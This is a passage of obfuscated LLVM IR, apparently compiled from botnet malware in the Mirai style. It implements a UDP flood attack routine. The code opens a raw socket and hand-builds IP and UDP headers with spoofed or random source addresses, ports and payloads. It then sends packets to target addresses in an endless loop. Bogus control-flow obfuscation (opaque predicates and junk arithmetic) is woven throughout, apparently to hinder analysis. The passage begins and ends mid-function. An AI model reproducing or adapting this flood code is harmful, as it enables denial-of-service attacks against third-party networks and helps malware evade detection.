  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #7
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %92

; <label>:75:                                     ; preds = %72
  %76 = load i32, i32* @x.31
  %77 = load i32, i32* @y.32
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %75
  %84 = load i32, i32* @x.31
  %85 = load i32, i32* @y.32
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %440

; <label>:92:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %93 = load i32, i32* %10, align 4
  %94 = bitcast i32* %9 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #7
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %116

; <label>:97:                                     ; preds = %92
  %98 = load i32, i32* @x.31
  %99 = load i32, i32* @y.32
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load i32, i32* %10, align 4
  %107 = call i32 @close(i32 %106)
  %108 = load i32, i32* @x.31
  %109 = load i32, i32* @y.32
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %440

; <label>:116:                                    ; preds = %92
  store i32 0, i32* %9, align 4
  br label %117

; <label>:117:                                    ; preds = %247, %116
  %118 = load i32, i32* @x.31
  %119 = load i32, i32* @y.32
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %117
  %126 = load i32, i32* %9, align 4
  %127 = load i8, i8* %5, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %126, %128
  %130 = load i32, i32* @x.31
  %131 = load i32, i32* @y.32
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %129, label %138, label %250

; <label>:138:                                    ; preds = %originalBBpart28
  %139 = load i32, i32* @x.31
  %140 = load i32, i32* @y.32
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %148 = load i8**, i8*** %11, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8*, i8** %148, i64 %150
  store i8* %147, i8** %151, align 8
  %152 = load i8**, i8*** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8*, i8** %152, i64 %154
  %156 = load i8*, i8** %155, align 8
  %157 = bitcast i8* %156 to %struct.iphdr*
  store %struct.iphdr* %157, %struct.iphdr** %21, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i64 1
  %160 = bitcast %struct.iphdr* %159 to %struct.udphdr*
  store %struct.udphdr* %160, %struct.udphdr** %22, align 8
  %161 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %162 = bitcast %struct.iphdr* %161 to i8*
  %163 = load i8, i8* %162, align 4
  %164 = and i8 %163, 15
  %165 = or i8 %164, 64
  store i8 %165, i8* %162, align 4
  %166 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %167 = bitcast %struct.iphdr* %166 to i8*
  %168 = load i8, i8* %167, align 4
  %169 = and i8 %168, -16
  %170 = or i8 %169, 5
  store i8 %170, i8* %167, align 4
  %171 = load i8, i8* %12, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 1
  store i8 %171, i8* %173, align 1
  %174 = load i16, i16* %18, align 2
  %175 = zext i16 %174 to i64
  %176 = add i64 28, %175
  %177 = trunc i64 %176 to i16
  %178 = call zeroext i16 @htons(i16 zeroext %177) #8
  %179 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 2
  store i16 %178, i16* %180, align 2
  %181 = load i16, i16* %13, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #8
  %183 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 3
  store i16 %182, i16* %184, align 4
  %185 = load i8, i8* %14, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 5
  store i8 %185, i8* %187, align 4
  %188 = load i8, i8* %15, align 1
  %189 = icmp ne i8 %188, 0
  %190 = load i32, i32* @x.31
  %191 = load i32, i32* @y.32
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart243, label %originalBB10alteredBB

originalBBpart243:                                ; preds = %originalBB10
  br i1 %189, label %198, label %218

; <label>:198:                                    ; preds = %originalBBpart243
  %199 = load i32, i32* @x.31
  %200 = load i32, i32* @y.32
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %198
  %207 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %208 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 4
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* @x.31
  %211 = load i32, i32* @y.32
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %218

; <label>:218:                                    ; preds = %originalBBpart247, %originalBBpart243
  %219 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 6
  store i8 17, i8* %220, align 1
  %221 = load i32, i32* %20, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 8
  store i32 %221, i32* %223, align 4
  %224 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %227, i32 0, i32 1
  %229 = load i32, i32* %228, align 4
  %230 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 9
  store i32 %229, i32* %231, align 4
  %232 = load i16, i16* %16, align 2
  %233 = call zeroext i16 @htons(i16 zeroext %232) #8
  %234 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  %236 = load i16, i16* %17, align 2
  %237 = call zeroext i16 @htons(i16 zeroext %236) #8
  %238 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %239 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %238, i32 0, i32 1
  store i16 %237, i16* %239, align 2
  %240 = load i16, i16* %18, align 2
  %241 = zext i16 %240 to i64
  %242 = add i64 8, %241
  %243 = trunc i64 %242 to i16
  %244 = call zeroext i16 @htons(i16 zeroext %243) #8
  %245 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 2
  store i16 %244, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %218
  %248 = load i32, i32* %9, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %9, align 4
  br label %117

; <label>:250:                                    ; preds = %originalBBpart28
  br label %251

; <label>:251:                                    ; preds = %439, %250
  store i32 0, i32* %9, align 4
  br label %252

; <label>:252:                                    ; preds = %436, %251
  %253 = load i32, i32* @x.31
  %254 = load i32, i32* @y.32
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %252
  %261 = load i32, i32* %9, align 4
  %262 = load i8, i8* %5, align 1
  %263 = zext i8 %262 to i32
  %264 = icmp slt i32 %261, %263
  %265 = load i32, i32* @x.31
  %266 = load i32, i32* @y.32
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %264, label %273, label %439

; <label>:273:                                    ; preds = %originalBBpart251
  %274 = load i32, i32* @x.31
  %275 = load i32, i32* @y.32
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %273
  %282 = load i8**, i8*** %11, align 8
  %283 = load i32, i32* %9, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8*, i8** %282, i64 %284
  %286 = load i8*, i8** %285, align 8
  store i8* %286, i8** %23, align 8
  %287 = load i8*, i8** %23, align 8
  %288 = bitcast i8* %287 to %struct.iphdr*
  store %struct.iphdr* %288, %struct.iphdr** %24, align 8
  %289 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i64 1
  %291 = bitcast %struct.iphdr* %290 to %struct.udphdr*
  store %struct.udphdr* %291, %struct.udphdr** %25, align 8
  %292 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i64 1
  %294 = bitcast %struct.udphdr* %293 to i8*
  store i8* %294, i8** %26, align 8
  %295 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %296 = load i32, i32* %9, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i64 %297
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %298, i32 0, i32 2
  %300 = load i8, i8* %299, align 4
  %301 = zext i8 %300 to i32
  %302 = icmp slt i32 %301, 32
  %303 = load i32, i32* @x.31
  %304 = load i32, i32* @y.32
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %302, label %311, label %332

; <label>:311:                                    ; preds = %originalBBpart255
  %312 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %313 = load i32, i32* %9, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i32 0, i32 1
  %317 = load i32, i32* %316, align 4
  %318 = call i32 @ntohl(i32 %317) #8
  %319 = call i32 @rand_next()
  %320 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i32 0, i32 2
  %325 = load i8, i8* %324, align 4
  %326 = zext i8 %325 to i32
  %327 = lshr i32 %319, %326
  %328 = add i32 %318, %327
  %329 = call i32 @htonl(i32 %328) #8
  %330 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 9
  store i32 %329, i32* %331, align 4
  br label %332

; <label>:332:                                    ; preds = %311, %originalBBpart255
  %333 = load i32, i32* %20, align 4
  %334 = icmp eq i32 %333, -1
  br i1 %334, label %335, label %339

; <label>:335:                                    ; preds = %332
  %336 = call i32 @rand_next()
  %337 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 8
  store i32 %336, i32* %338, align 4
  br label %339

; <label>:339:                                    ; preds = %335, %332
  %340 = load i32, i32* @x.31
  %341 = load i32, i32* @y.32
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %339
  %348 = load i16, i16* %13, align 2
  %349 = zext i16 %348 to i32
  %350 = icmp eq i32 %349, 65535
  %351 = load i32, i32* @x.31
  %352 = load i32, i32* @y.32
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %350, label %359, label %364

; <label>:359:                                    ; preds = %originalBBpart259
  %360 = call i32 @rand_next()
  %361 = trunc i32 %360 to i16
  %362 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %363 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %362, i32 0, i32 3
  store i16 %361, i16* %363, align 4
  br label %364

; <label>:364:                                    ; preds = %359, %originalBBpart259
  %365 = load i16, i16* %16, align 2
  %366 = zext i16 %365 to i32
  %367 = icmp eq i32 %366, 65535
  br i1 %367, label %368, label %373

; <label>:368:                                    ; preds = %364
  %369 = call i32 @rand_next()
  %370 = trunc i32 %369 to i16
  %371 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %372 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 2
  br label %373

; <label>:373:                                    ; preds = %368, %364
  %374 = load i16, i16* %17, align 2
  %375 = zext i16 %374 to i32
  %376 = icmp eq i32 %375, 65535
  br i1 %376, label %377, label %382

; <label>:377:                                    ; preds = %373
  %378 = call i32 @rand_next()
  %379 = trunc i32 %378 to i16
  %380 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %381 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  br label %382

; <label>:382:                                    ; preds = %377, %373
  %383 = load i8, i8* %19, align 1
  %384 = icmp ne i8 %383, 0
  br i1 %384, label %385, label %389

; <label>:385:                                    ; preds = %382
  %386 = load i8*, i8** %26, align 8
  %387 = load i16, i16* %18, align 2
  %388 = zext i16 %387 to i32
  call void @rand_str(i8* %386, i32 %388)
  br label %389

; <label>:389:                                    ; preds = %385, %382
  %390 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i32 0, i32 7
  store i16 0, i16* %391, align 2
  %392 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %393 = bitcast %struct.iphdr* %392 to i16*
  %394 = call zeroext i16 @checksum_generic(i16* %393, i32 20)
  %395 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 7
  store i16 %394, i16* %396, align 2
  %397 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %398 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %397, i32 0, i32 3
  store i16 0, i16* %398, align 2
  %399 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %400 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %401 = bitcast %struct.udphdr* %400 to i8*
  %402 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 2
  %404 = load i16, i16* %403, align 2
  %405 = load i16, i16* %18, align 2
  %406 = zext i16 %405 to i64
  %407 = add i64 8, %406
  %408 = trunc i64 %407 to i32
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %399, i8* %401, i16 zeroext %404, i32 %408)
  %410 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %411 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %410, i32 0, i32 3
  store i16 %409, i16* %411, align 2
  %412 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %413 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %23, align 8
  %423 = load i16, i16* %18, align 2
  %424 = zext i16 %423 to i64
  %425 = add i64 28, %424
  %426 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = bitcast %struct.sockaddr_in* %431 to %struct.sockaddr*
  store %struct.sockaddr* %432, %struct.sockaddr** %426, align 8
  %433 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %434 = load %struct.sockaddr*, %struct.sockaddr** %433, align 8
  %435 = call i64 @sendto(i32 %421, i8* %422, i64 %425, i32 16384, %struct.sockaddr* %434, i32 16)
  br label %436

; <label>:436:                                    ; preds = %389
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %252

; <label>:439:                                    ; preds = %originalBBpart251
  br label %251

; <label>:440:                                    ; preds = %originalBBpart24, %originalBBpart2
  %441 = load i32, i32* @x.31
  %442 = load i32, i32* @y.32
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %440
  %449 = load i32, i32* @x.31
  %450 = load i32, i32* @y.32
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %75
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  %457 = load i32, i32* %10, align 4
  %458 = call i32 @close(i32 %457)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %117
  %459 = load i32, i32* %9, align 4
  %460 = load i8, i8* %5, align 1
  %461 = zext i8 %460 to i32
  %462 = icmp slt i32 %459, %461
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %463 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %464 = load i8**, i8*** %11, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds i8*, i8** %464, i64 %466
  store i8* %463, i8** %467, align 8
  %468 = load i8**, i8*** %11, align 8
  %469 = load i32, i32* %9, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds i8*, i8** %468, i64 %470
  %472 = load i8*, i8** %471, align 8
  %473 = bitcast i8* %472 to %struct.iphdr*
  store %struct.iphdr* %473, %struct.iphdr** %21, align 8
  %474 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i64 1
  %476 = bitcast %struct.iphdr* %475 to %struct.udphdr*
  store %struct.udphdr* %476, %struct.udphdr** %22, align 8
  %477 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %478 = bitcast %struct.iphdr* %477 to i8*
  %479 = load i8, i8* %478, align 4
  %_ = sub i8 %479, 15
  %gen = mul i8 %_, 15
  %_11 = shl i8 %479, 15
  %_12 = shl i8 %479, 15
  %_13 = sub i8 0, %479
  %gen14 = add i8 %_13, 15
  %_15 = shl i8 %479, 15
  %480 = and i8 %479, 15
  %_16 = sub i8 0, %480
  %gen17 = add i8 %_16, 64
  %_18 = shl i8 %480, 64
  %481 = or i8 %480, 64
  store i8 %481, i8* %478, align 4
  %482 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %483 = bitcast %struct.iphdr* %482 to i8*
  %484 = load i8, i8* %483, align 4
  %_19 = shl i8 %484, -16
  %_20 = sub i8 %484, -16
  %gen21 = mul i8 %_20, -16
  %485 = and i8 %484, -16
  %_22 = sub i8 %485, 5
  %gen23 = mul i8 %_22, 5
  %_24 = sub i8 0, %485
  %gen25 = add i8 %_24, 5
  %_26 = sub i8 0, %485
  %gen27 = add i8 %_26, 5
  %_28 = sub i8 %485, 5
  %gen29 = mul i8 %_28, 5
  %486 = or i8 %485, 5
  store i8 %486, i8* %483, align 4
  %487 = load i8, i8* %12, align 1
  %488 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 1
  store i8 %487, i8* %489, align 1
  %490 = load i16, i16* %18, align 2
  %491 = zext i16 %490 to i64
  %_30 = sub i64 28, %491
  %gen31 = mul i64 %_30, %491
  %_32 = sub i64 0, 28
  %gen33 = add i64 %_32, %491
  %_34 = sub i64 0, 28
  %gen35 = add i64 %_34, %491
  %_36 = sub i64 28, %491
  %gen37 = mul i64 %_36, %491
  %_38 = sub i64 0, 28
  %gen39 = add i64 %_38, %491
  %_40 = sub i64 28, %491
  %gen41 = mul i64 %_40, %491
  %492 = add i64 28, %491
  %493 = trunc i64 %492 to i16
  %494 = call zeroext i16 @htons(i16 zeroext %493) #8
  %495 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 2
  store i16 %494, i16* %496, align 2
  %497 = load i16, i16* %13, align 2
  %498 = call zeroext i16 @htons(i16 zeroext %497) #8
  %499 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 3
  store i16 %498, i16* %500, align 4
  %501 = load i8, i8* %14, align 1
  %502 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 5
  store i8 %501, i8* %503, align 4
  %504 = load i8, i8* %15, align 1
  %505 = icmp ne i8 %504, 0
  br label %originalBB10

originalBB45alteredBB:                            ; preds = %originalBB45, %198
  %506 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %507 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 4
  store i16 %506, i16* %508, align 2
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %252
  %509 = load i32, i32* %9, align 4
  %510 = load i8, i8* %5, align 1
  %511 = zext i8 %510 to i32
  %512 = icmp slt i32 %509, %511
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %273
  %513 = load i8**, i8*** %11, align 8
  %514 = load i32, i32* %9, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds i8*, i8** %513, i64 %515
  %517 = load i8*, i8** %516, align 8
  store i8* %517, i8** %23, align 8
  %518 = load i8*, i8** %23, align 8
  %519 = bitcast i8* %518 to %struct.iphdr*
  store %struct.iphdr* %519, %struct.iphdr** %24, align 8
  %520 = load %struct.iphdr*, %struct.iphdr** %24, align 8
